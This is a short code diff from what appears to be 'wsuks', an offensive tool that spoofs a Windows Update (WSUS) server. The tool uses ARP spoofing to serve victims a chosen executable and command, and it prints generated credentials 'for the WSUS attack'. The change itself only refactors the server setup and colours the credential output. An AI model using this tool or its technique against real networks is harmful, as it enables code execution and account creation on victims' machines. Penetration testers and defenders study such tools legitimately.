@@ -12,7 +12,8 @@ from wsuks.helpers.arpspoofer import ArpSpoofer
 from wsuks.helpers.logger import initLogger
 from wsuks.helpers.argparser import initParser, printBanner
 from wsuks.helpers.sysvolparser import SysvolParser
-from wsuks.helpers.wsusserver import WSUSUpdateHandler
+from wsuks.helpers.wsusserver import WSUSUpdateHandler, WSUSBaseServer
+from termcolor import colored
 
 
 class Wsuks:
@@ -51,14 +52,15 @@ class Wsuks:
 
         # Prepare WSUS Update Handler
         # sniff(filter="tcp and port 8530", prn=self.handlePacket, store=0)
-        update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}', self.logger)
+        update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}')
         update_handler.set_resources_xml(self.command)
 
         self.logger.debug(update_handler)
 
         # Prepare WSUS HTTP Server
-        http_server = HTTPServer((self.hostIp, self.wsusPort), update_handler)
-        self.logger.success(f"Generated Credentials for the WSUS attack: Username={self.local_username} Password={self.local_password}")
+        wsusBaseServer = WSUSBaseServer(update_handler)
+        http_server = HTTPServer((self.hostIp, self.wsusPort), wsusBaseServer)
+        self.logger.success(f"Generated Credentials for the WSUS attack: Username={colored(self.local_username, 'green', attrs=['bold'])} Password={colored(self.local_password, 'green', attrs=['bold'])}")
         try:
             self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
             http_server.serve_forever()
@@ -79,7 +81,7 @@ def main():
 
     logger = initLogger(debug=args.debug)
     logger.debug('Passed args:\n' + pformat(vars(args)))
-    
+
     # Prevent scapy from logging to console
     scapyLogger = logging.getLogger('scapy')
     scapyLogger.handlers.clear()
